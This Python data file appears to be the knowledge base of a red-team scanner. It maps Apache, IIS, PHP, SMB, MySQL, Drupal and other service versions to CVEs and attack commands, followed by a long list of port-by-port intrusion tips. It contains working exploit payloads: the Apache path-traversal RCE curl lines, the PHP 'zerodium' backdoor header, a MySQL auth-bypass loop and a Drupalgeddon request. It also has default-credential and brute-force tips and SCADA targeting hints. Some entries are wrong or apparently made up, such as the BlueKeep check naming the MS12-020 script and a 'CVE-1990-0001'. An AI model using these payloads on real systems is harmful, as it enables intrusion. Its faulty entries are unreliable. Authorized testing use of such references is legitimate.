RED_TEAM_KB = {
    "web": {
        "apache": [
            {"match": "2.4.49", "name": "CVE-2021-41773", "risk": "CRITICAL", "score": 95, "desc": "Path Traversal & RCE", "action": "curl -s --path-as-is http://<target>/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh"},
            {"match": "2.4.50", "name": "CVE-2021-42013", "risk": "CRITICAL", "score": 95, "desc": "Incomplete fix for CVE-2021-41773", "action": "curl -s --path-as-is http://<target>/cgi-bin/.%%32%65/.%%32%65/.%%32%65/bin/sh"},
            {"match": "2.2", "name": "Legacy Apache", "risk": "MEDIUM", "score": 50, "desc": "Outdated Apache 2.2", "action": "Check for Heartbleed if OpenSSL linked (if < 1.0.1g) or CVE-2011-3192 (DoS)."}
        ],
        "nginx": [
            {"match": "1.20.1", "name": "Nginx Misconfig", "risk": "MEDIUM", "score": 45, "desc": "Potential alias traversal", "action": "Check for off-by-slash in configuration."},
            {"match": "1.1", "name": "Nginx Information Disclosure", "risk": "LOW", "score": 20, "desc": "Version tokens might be enabled", "action": "Modify nginx.conf to server_tokens off;"}
        ],
        "iis": [
            {"match": "6.0", "name": "CVE-2017-7269", "risk": "CRITICAL", "score": 90, "desc": "WebDAV ScStoragePathFromUrl RCE", "action": "Use msf: exploit/windows/iis/iis_webdav_scstoragepathfromurl"},
            {"match": "7.5", "name": "IIS Shortname", "risk": "MEDIUM", "score": 55, "desc": "8.3 file enumeration", "action": "Use tool: iis-shortname-scanner-py"},
            {"match": "10.0", "name": "IIS Tilde Discovery", "risk": "LOW", "score": 30, "desc": "Directory enumeration via ~", "action": "Check for sensitive folders."}
        ],
        "php": [
            {"match": "8.1.0-dev", "name": "PHP 8.1.0-dev Backdoor", "risk": "CRITICAL", "score": 100, "desc": "User-Agentt Backdoor", "action": "Header 'User-Agentt: zerodium system(\"id\");'"}
        ]
    },
    "infra": {
        "smb": [
            {"match": "all", "name": "SMB Signing Disabled", "risk": "HIGH", "score": 85, "desc": "Relay attack possible", "action": "Check with nmap: nmap --script smb-security-mode -p445 <target>"},
            {"match": "all", "name": "SMB Null Session", "risk": "HIGH", "score": 80, "desc": "Guest login allowed", "action": "enum4linux -a <target>"},
            {"match": "all", "name": "EternalBlue Candidate", "risk": "CRITICAL", "score": 98, "desc": "EternalBlue (MS17-010)", "action": "nmap -p445 --script smb-vuln-ms17-010 <target>"}
        ],
        "rdp": [
            {"match": "all", "name": "BlueKeep Candidate", "risk": "CRITICAL", "score": 96, "desc": "CVE-2019-0708", "action": "Check with nmap: nmap -p3389 --script rdp-vuln-ms12-020 <target>"}
        ],
        "ssh": [
            {"match": "libssh", "name": "libssh Auth Bypass", "risk": "CRITICAL", "score": 92, "desc": "CVE-2018-10933", "action": "Attempt auth skip via MSG_USERAUTH_SUCCESS."}
        ]
    },
    "db": {
        "mysql": [
            {"match": "all", "name": "MySQL Default Root", "risk": "HIGH", "score": 88, "desc": "No password for root", "action": "mysql -h <target> -u root"},
            {"match": "5.5", "name": "CVE-2012-2122", "risk": "HIGH", "score": 85, "desc": "Auth Bypass via password mismatch", "action": "Run: for i in `seq 1 512`; do mysql -h <target> -u root --password=bad -e \"select 1\" 2>/dev/null && break; done"}
        ],
        "redis": [
            {"match": "all", "name": "Redis No Auth", "risk": "HIGH", "score": 90, "desc": "Unauthenticated instance", "action": "redis-cli -h <target> info"}
        ],
        "postgresql": [
            {"match": "all", "name": "PostgreSQL Default Creds", "risk": "HIGH", "score": 85, "desc": "postgres/postgres default", "action": "psql -h <target> -U postgres"}
        ]
    },
    "cms": {
        "wordpress": [
            {"match": "all", "name": "WordPress XML-RPC", "risk": "MEDIUM", "score": 40, "desc": "Bruteforce / Pingback", "action": "Check /xmlrpc.php for brute force via multicall."},
            {"match": "all", "name": "WordPress User Enum", "risk": "LOW", "score": 30, "desc": "REST API user leak", "action": "Access /wp-json/wp/v2/users"}
        ],
        "drupal": [
            {"match": "all", "name": "Drupalgeddon 2", "risk": "CRITICAL", "score": 99, "desc": "CVE-2018-7600", "action": "PoC: user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"}
        ]
    }
}

# General Tips (TTPs)
GENERAL_TIPS = [
    {"port": 21, "tool": "nmap", "tip": "FTP: Check for anonymous login."},
    {"port": 22, "tool": "ssh", "tip": "SSH: Try user enumeration with 'id_rsa' of common users."},
    {"port": 23, "tool": "telnet", "tip": "Telnet: Check for default passwords."},
    {"port": 25, "tool": "nmap", "tip": "SMTP: Try VRFY/EXPN for user enumeration."},
    {"port": 53, "tool": "dig", "tip": "DNS: Attempt Zone Transfer (AXFR) with 'dig axfr @<target> domain'."},
    {"port": 80, "tool": "ffuf", "tip": "HTTP: Fuzz for '.env', '.git', '.svn', 'config.php'."},
    {"port": 88, "tool": "kerbrute", "tip": "Kerberos: Attempt User Enumeration."},
    {"port": 110, "tool": "pop3", "tip": "POP3: Check for cleartext credentials."},
    {"port": 111, "tool": "rpcinfo", "tip": "RPC: Check for NFS shares or mounts."},
    {"port": 139, "tool": "smb", "tip": "SMB: Check for NetBIOS name leakage."},
    {"port": 161, "tool": "onesixtyone", "tip": "SNMP: Bruteforce community strings (public/private)."},
    {"port": 389, "tool": "ldapsearch", "tip": "LDAP: Try anonymous bind or Naming Contexts."},
    {"port": 443, "tool": "openssl", "tip": "HTTPS: Check SSL/TLS version & expired certs."},
    {"port": 445, "tool": "crackmapexec", "tip": "SMB: Check for SMB Signing and lateral movement paths."},
    {"port": 500, "tool": "ike-scan", "tip": "VPN: Identify IKE transforms and aggressive mode."},
    {"port": 512, "tool": "rlogin", "tip": "R-Services: Check for trust relationships."},
    {"port": 514, "tool": "syslog", "tip": "Syslog: Sniff for remote logging data."},
    {"port": 631, "tool": "cups", "tip": "CUPS: Check for shared printers info leakage."},
    {"port": 873, "tool": "rsync", "tip": "Rsync: Check for unauthenticated share access."},
    {"port": 1099, "tool": "rmiscan", "tip": "Java RMI: Check for deserialization vulns."},
    {"port": 1433, "tool": "mssql-cli", "tip": "MSSQL: Try default 'sa' user without password."},
    {"port": 1521, "tool": "sidguess", "tip": "Oracle: Guess SID and bruteforce TNS listeners."},
    {"port": 2049, "tool": "showmount", "tip": "NFS: Run 'showmount -e <target>' for shares."},
    {"port": 2375, "tool": "docker", "tip": "Docker: Check for exposed Docker API (RCE)."},
    {"port": 3306, "tool": "mysql", "tip": "MySQL: Check for remote access root."},
    {"port": 3389, "tool": "xfreerdp", "tip": "RDP: Check for NLA requirement."},
    {"port": 3690, "tool": "svn", "tip": "SVN: Check for exposed Subversion repo."},
    {"port": 4444, "tool": "nmap", "tip": "Metasploit: Port 4444 is common for payloads."},
    {"port": 5000, "tool": "nmap", "tip": "Docker/Python: Common dev port, check for /v2/."},
    {"port": 5432, "tool": "psql", "tip": "PostgreSQL: Check for trust authentication."},
    {"port": 5601, "tool": "kibana", "tip": "Kibana: Check for dashboard exposure."},
    {"port": 5900, "tool": "vncviewer", "tip": "VNC: Check for weak password or no auth."},
    {"port": 5985, "tool": "evil-winrm", "tip": "WinRM: Check for HTTP remote management."},
    {"port": 5986, "tool": "evil-winrm", "tip": "WinRM: Check for HTTPS remote management."},
    {"port": 6379, "tool": "redis", "tip": "Redis: Check for unauthenticated CLI access."},
    {"port": 6443, "tool": "kubectl", "tip": "K8s: Check for Kubernetes API access."},
    {"port": 8000, "tool": "ffuf", "tip": "Dev Web: Common for Django/Flask, check for DEBUG mode."},
    {"port": 8080, "tool": "nmap", "tip": "Tomcat: Check /manager/html for default creds."},
    {"port": 8161, "tool": "activemq", "tip": "ActiveMQ: Check for management console."},
    {"port": 8443, "tool": "nmap", "tip": "Alternative HTTPS: Check for management portals."},
    {"port": 8888, "tool": "nmap", "tip": "Jupyter/Web: Check for notebooks access."},
    {"port": 9000, "tool": "nmap", "tip": "PHP-FPM: Check for port exposure (potential RCE)."},
    {"port": 9090, "tool": "prometheus", "tip": "Prometheus: Check for metrics leakage."},
    {"port": 9200, "tool": "elasticsearch", "tip": "Elasticsearch: Check /_cat/indices for data leak."},
    {"port": 10000, "tool": "webmin", "tip": "Webmin: Check for CVE-2019-15107 (rce)."},
    {"port": 11211, "tool": "telnet", "tip": "Memcached: Check for unauth stats access."},
    {"port": 27017, "tool": "mongodb", "tip": "MongoDB: Check for unauth access to databases."},
    {"port": 50000, "tool": "jenkins", "tip": "Jenkins: Check for unauth build console."},
    {"port": 111, "tool": "nmap", "tip": "RPCBind: Check for NFS/Mountd exports."},
    {"port": 2049, "tool": "nmap", "tip": "NFS: Check for world-writable shares."},
    {"port": 3389, "tool": "crowbar", "tip": "RDP: Attempt dictionary attack with common usernames."},
    {"port": 5900, "tool": "vncpasswd", "tip": "VNC: Check for weak / default passwords."},
    {"port": 21, "tool": "hydra", "tip": "FTP: Bruteforce with standard admin/admin."},
    {"port": 22, "tool": "nmap", "tip": "SSH: Identify supported auth methods (password vs key)."},
    {"port": 25, "tool": "nmap", "tip": "SMTP: Check for Open Relay configuration."},
    {"port": 53, "tool": "dnsrecon", "tip": "DNS: Perform SRV record lookup for service discovery."},
    {"port": 80, "tool": "nikto", "tip": "HTTP: Run Nikto for common web misconfigs."},
    {"port": 443, "tool": "testssl", "tip": "HTTPS: Test for BREACH, CRIME, and SWEET32."},
    {"port": 445, "tool": "impacket", "tip": "SMB: Check for PetitPotam (Relay) or Samr dumping."},
    {"port": 1433, "tool": "msenumarps", "tip": "MSSQL: Enumerate instances and login options."},
    {"port": 3306, "tool": "nmap", "tip": "MySQL: Enumerate users with mysql-enum script."},
    {"port": 5432, "tool": "nmap", "tip": "PostgreSQL: Check for SSL requirement."},
    {"port": 6379, "tool": "nmap", "tip": "Redis: Request 'KEYS *' to see database size."},
    {"port": 8080, "tool": "nmap", "tip": "HTTP-Proxy: Check for open proxy redirection."},
    {"port": 9200, "tool": "nmap", "tip": "Elasticsearch: Check for /_cat/nodes for cluster info."},
    {"port": 27017, "tool": "nmap", "tip": "MongoDB: Check listDatabases command unauth."},
    {"port": 3000, "tool": "grafana", "tip": "Grafana: Check for default admin/admin."},
    {"port": 9000, "tool": "portainer", "tip": "Portainer: Check for default credentials."},
    {"port": 8081, "tool": "nexus", "tip": "Nexus OSS: Check for default admin/admin123."},
    {"port": 4443, "tool": "nmap", "tip": "Plesk/Web: Check for management console."},
    {"port": 10000, "tool": "webmin", "tip": "Webmin: Check for login as root/admin."},
    {"port": 8086, "tool": "influxdb", "tip": "InfluxDB: Check for unauth API access."},
    {"port": 5672, "tool": "rabbitmq", "tip": "RabbitMQ: Check for guest/guest default."},
    {"port": 15672, "tool": "rabbitmq", "tip": "RabbitMQ Management: Check for UI exposure."},
    {"port": 1883, "tool": "mqtt", "tip": "MQTT: Check for unauth topic subscription."},
    {"port": 3268, "tool": "ldap", "tip": "Global Catalog: AD Global Catalog enumeration."},
    {"port": 3269, "tool": "ldaps", "tip": "Global Catalog SSL: Secure AD enumeration."},
    {"port": 5060, "tool": "sip", "tip": "SIP/VoIP: Check for user enumeration / extensions."},
    {"port": 2480, "tool": "orientdb", "tip": "OrientDB: Check for default root/root."},
    {"port": 4242, "tool": "nmap", "tip": "CJDNS: Potential CJDNS node."},
    {"port": 7001, "tool": "weblogic", "tip": "WebLogic: Check for T3 protocol / deserialization."},
    {"port": 7002, "tool": "weblogic", "tip": "WebLogic SSL: Check for T3s protocol."},
    {"port": 9043, "tool": "websphere", "tip": "WebSphere: Check for admin console login."},
    {"port": 9443, "tool": "nmap", "tip": "WSO2: Check for management console."},
    {"port": 1090, "tool": "nmap", "tip": "Java RMI: Check for RMI registry exposure."},
    {"port": 1100, "tool": "nmap", "tip": "Java RMI: Alternate RMI port."},
    {"port": 62078, "tool": "nmap", "tip": "Apple Sync: Possible iPhone/itunes sync service."},
    {"port": 1723, "tool": "pptp", "tip": "PPTP VPN: Check for GRE/PPTP encapsulation."},
    {"port": 47, "tool": "nmap", "tip": "GRE: Check for GRE tunneling (routing)."},
    {"port": 1701, "tool": "l2tp", "tip": "L2TP VPN: Check for IKEv1/v2 support."},
    {"port": 4500, "tool": "ipsec", "tip": "IPSec NAT-T: Common for VPN tunnels."},
    {"port": 1194, "tool": "openvpn", "tip": "OpenVPN: Check for certificate requirement."},
    {"port": 4445, "tool": "nmap", "tip": "Metasploit: Alternate payload port."},
    {"port": 5555, "tool": "adb", "tip": "Android ADB: Check for remote ADB access (RCE)."},
    {"port": 5037, "tool": "adb", "tip": "ADB Server: Check for local ADB server."},
    {"port": 1080, "tool": "socks", "tip": "SOCKS Proxy: Check for open relay."},
    {"port": 3128, "tool": "squid", "tip": "Squid Proxy: Check for HTTP proxy tunneling."},
    {"port": 6666, "tool": "irc", "tip": "IRC: Check for outdated IRC daemons."},
    {"port": 6667, "tool": "irc", "tip": "IRC: Common default IRC port."},
    {"port": 6697, "tool": "ircs", "tip": "IRCS: Encrypted IRC communication."},
    {"port": 5800, "tool": "vnc", "tip": "VNC over HTTP: Check for browser-based VNC."},
    {"port": 5901, "tool": "vnc", "tip": "VNC Display 1: Often used for first VNC instance."},
    {"port": 30005, "tool": "pax", "tip": "Pax: Check for specialized services."},
    {"port": 10250, "tool": "kubelet", "tip": "Kubelet Read-only: Check for /pods/ listing."},
    {"port": 10255, "tool": "kubelet", "tip": "Kubelet Stats: Leakage of cluster info."},
    {"port": 1900, "tool": "upnp", "tip": "UPnP: Check for SSDP info leakage."},
    {"port": 5353, "tool": "mdns", "tip": "mDNS: Check for local service discovery leakage."},
    {"port": 5355, "tool": "llmnr", "tip": "LLMNR: Check for Spoofing / Relaying."},
    {"port": 137, "tool": "nbns", "tip": "NetBIOS-NS: Check for name resolution leakage."},
    {"port": 138, "tool": "nbdgm", "tip": "NetBIOS-DGM: Check for packet leakage."},
    {"port": 162, "tool": "snmptrap", "tip": "SNMP Trap: Listen for device alerts."},
    {"port": 465, "tool": "smtps", "tip": "SMTPS: Secure SMTP (SSL)."},
    {"port": 587, "tool": "smtp", "tip": "SMTP Submission: Check for auth relay."},
    {"port": 993, "tool": "imaps", "tip": "IMAPS: Secure IMAP."},
    {"port": 995, "tool": "pop3s", "tip": "POP3S: Secure POP3."},
    {"port": 2525, "tool": "smtp", "tip": "Alternative SMTP: Often used by devs."},
    {"port": 3283, "tool": "ard", "tip": "Apple Remote Desktop: Check for ARD."},
    {"port": 548, "tool": "afp", "tip": "AFP: Apple Filing Protocol - check for guest access."},
    {"port": 515, "tool": "lpd", "tip": "LPD: Line Printer Daemon - check for print jobs."},
    {"port": 9100, "tool": "pjl", "tip": "JetDirect: Send PJL commands to read files."},
    {"port": 49152, "tool": "msrpc", "tip": "High RPC: Check for dynamic RPC endpoints."},
    {"port": 49153, "tool": "msrpc", "tip": "High RPC: Dynamic port allocation."},
    {"port": 102, "tool": "s7", "tip": "Siemens S7: Check for PLCs (SCADA)."},
    {"port": 502, "tool": "modbus", "tip": "Modbus: Check for industrial controllers (SCADA)."},
    {"port": 47808, "tool": "bacnet", "tip": "BACnet: Building Automation & Control (SCADA)."},
    {"port": 1911, "tool": "fox", "tip": "Niagara Fox: Check for Tridium Niagara info leakage."},
    {"port": 4911, "tool": "nmap", "tip": "Niagara Fox SSL: Secure building automation comms."},
    {"port": 2404, "tool": "iec-104", "tip": "IEC 60870-5-104: Check for power system telecontrol."},
    {"port": 20000, "tool": "dnp3", "tip": "DNP3: Distributed Network Protocol for utilities."},
    {"port": 9600, "tool": "omron", "tip": "Omron FINS: Check for Omron PLC exposure."},
    {"port": 1962, "tool": "pcworx", "tip": "PCWorx: Check for Phoenix Contact PLC exposure."},
    {"port": 20547, "tool": "proconos", "tip": "Proconos: Check for KW-Software PLC exposure."},
    {"port": 10001, "tool": "nmap", "tip": "Lantronix: Check for serial-to-ethernet setup."},
    {"port": 30718, "tool": "nmap", "tip": "Lantronix: Alternate setup port."},
    {"port": 37, "tool": "nmap", "tip": "Time: Check for time protocol leakage."},
    {"port": 79, "tool": "finger", "tip": "Finger: Check for user info leakage (CVE-1990-0001)."},
    {"port": 513, "tool": "rlogin", "tip": "Rlogin: Check for .rhosts authentication bypass."},
    {"port": 543, "tool": "klogin", "tip": "Klogin: Check for Kerberos login exposure."},
    {"port": 544, "tool": "kshell", "tip": "Kshell: Check for Kerberos shell exposure."},
    {"port": 2100, "tool": "oracle", "tip": "Oracle XML DB: Check for unauth access."},
    {"port": 26208, "tool": "nmap", "tip": "Obscure: Possible rootkit or custom backdoor."},
    {"port": 554, "tool": "rtsp", "tip": "RTSP: Check for unauth IP camera streams."},
    {"port": 8008, "tool": "nmap", "tip": "Chromecast: Check for device info leakage."},
    {"port": 8009, "tool": "ajp", "tip": "AJP: Check for Ghostcat (CVE-2020-1938)."}
]


